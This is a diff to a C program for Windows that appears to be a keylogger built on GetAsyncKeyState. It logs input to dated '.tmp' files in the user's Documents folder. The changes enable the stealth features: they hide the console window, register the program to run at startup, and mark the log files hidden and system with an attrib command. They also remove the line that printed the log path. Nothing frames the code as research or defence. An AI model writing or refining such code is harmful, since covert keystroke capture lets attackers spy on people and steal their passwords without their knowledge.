@@ -12,7 +12,7 @@ GetAsyncKeyState
 #include <string.h>
 #include <windows.h>
 #include <time.h>
-
+#include <direct.h>
 //CONSTANTS
 #define FILENAME "cap"
 #define FILEEXTENSION ".tmp"
@@ -84,6 +84,7 @@ int main() {
   char monstr[2];
   char fileStr[512];
   char userName[180];
+  char tmpPath[512];
   DWORD username_len = 181;
   int exitFlag =0;
   int i=0;
@@ -96,10 +97,10 @@ int main() {
    now = time(0);
    ltm = localtime(&now);
   //hide console window
-  //ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);
+  ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);
   //register at startup
-  //RegisterProgram();
-  //SAFEPATH -> C:\USERS\$USERNAME$\DOCUMENTS\TEMP$DAY$_$MONTH$.TMP
+  RegisterProgram();
+  //SAFEPATH -> C:\USERS\$USERNAME$\DOCUMENTS\CAP$DAY$_$MONTH$.TMP
   month = ltm->tm_mon;
   month++;
   sprintf(daystr, "%d", ltm->tm_mday);
@@ -111,16 +112,19 @@ int main() {
   strcat(fileStr,"\\");
   strcat(fileStr,DOCUMENTS);
   strcat(fileStr,"\\");
+  strcpy(tmpPath,fileStr); //to use with attrib
   strcat(fileStr, FILENAME);
   strcat(fileStr, daystr);
   strcat(fileStr, "_");
   strcat(fileStr, monstr);
   strcat(fileStr, FILEEXTENSION);
-  printf("%s\n",fileStr);
+  //printf("%s\n",fileStr);
   if (file_exists(&fileHandler, fileStr) == 1)
      openFile(&fileHandler,fileStr,"a");
   else
     openFile(&fileHandler,fileStr, "w");
+  _chdir(tmpPath); //go to where tmp files are
+  system("attrib +h +s *.tmp");
   fprintf(fileHandler, "\n%s\n", asctime(ltm));
 
   do{
